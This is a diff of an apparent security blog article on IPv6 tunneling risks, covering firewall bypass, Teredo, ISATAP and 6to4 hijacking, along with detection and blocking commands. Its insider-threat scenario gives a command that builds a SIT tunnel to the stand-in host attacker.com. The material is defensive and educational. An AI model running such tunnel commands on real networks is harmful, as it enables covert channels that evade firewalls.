@@ -2,7 +2,7 @@
 
 Author: [nawazdhandala](https://www.github.com/nawazdhandala)
 
-Tags: IPv6, Tunneling, Security, Firewall Bypass, Covert Channel
+Tags: IPv6, Tunneling, Security, Firewall Bypass, Covert Channels
 
 Description: Learn the security risks of IPv6 tunneling mechanisms including firewall bypass, inspection gaps, covert channels, and how to detect and prevent unauthorized tunnels.
 
@@ -12,7 +12,7 @@ IPv6 tunneling mechanisms were designed to ease IPv4-to-IPv6 transition but they
 
 ## The Core Problem: Dual-Layer Inspection Gap
 
-```
+```text
 Organization's security stack:
 
 Layer 4:  Firewall (inspects IPv4 headers ✓)
@@ -32,24 +32,24 @@ Result: complete bypass of security infrastructure
 
 ## Firewall Bypass via Protocol 41
 
-```
+```text
 Attacker scenario:
 1. Attacker knows target network allows outbound HTTPS (port 443)
 2. Attacker sets up IPv6 tunnel broker or their own SIT relay
 3. Victim machine initiates 6in4 to attacker's relay (proto 41)
 4. IPv4 firewall: allows proto 41 (not blocked)
 5. IPv6 communication established over tunnel
-6. C2 traffic flows via IPv6 — bypasses all IPv4 controls
+6. C2 traffic flows via IPv6 - bypasses all IPv4 controls
 
 Detection: tcpdump -i eth0 "proto 41"
 Mitigation: iptables -A INPUT -p 41 -j DROP  (unless explicitly needed)
 ```
 
-## Teredo — Bypasses NAT and Firewall
+## Teredo - Bypasses NAT and Firewall
 
-```
+```text
 Attack vector:
-1. Host behind NAT/firewall — normally "protected" by NAT
+1. Host behind NAT/firewall - normally "protected" by NAT
 2. Teredo UDP 3544 allowed (or attacker uses high UDP ports)
 3. Teredo establishes IPv6 connectivity through NAT
 4. Now host has reachable IPv6 address (2001::/32)
@@ -80,7 +80,7 @@ IPv6 tunnels can carry data in a way that avoids DPI and logging:
 
 ## ISATAP Address Predictability
 
-```
+```text
 Enterprise IPv4 range: 10.1.0.0/16
 All ISATAP addresses: ::5efe:0a01:0000/112 (10.1.x.x)
 
@@ -95,7 +95,7 @@ Attacker can:
 
 An attacker inside the network creates unauthorized tunnels:
 
-```
+```text
 Insider threat scenario:
 1. Attacker has access to an internal Linux server
 2. Creates 6in4 tunnel: ip tunnel add sit1 mode sit remote attacker.com local 10.1.1.5
@@ -109,7 +109,7 @@ Prevention: Block proto 41 outbound at perimeter
 
 ## 6to4 Relay Hijacking
 
-```
+```text
 6to4 uses anycast relay 192.88.99.1
 The anycast can be announced by anyone with BGP access
 
@@ -124,6 +124,7 @@ Attack (historical, 2010-2015):
 
 ```bash
 # Block 6in4, 6to4, ISATAP, SIT (protocol 41)
+
 iptables -A INPUT   -p 41 -j DROP
 iptables -A OUTPUT  -p 41 -j DROP
 iptables -A FORWARD -p 41 -j DROP
@@ -156,7 +157,7 @@ tcpdump -i any "udp port 3544" -c 100 -n
 # Check for GRE
 tcpdump -i any "proto gre" -c 100 -n
 
-# NetFlow/IPFIX — filter for proto 41 flows
+# NetFlow/IPFIX - filter for proto 41 flows
 nfdump -r /var/cache/nfdump/nfcapd.current "proto 41"
 
 # Alert: any proto 41 traffic should be investigated
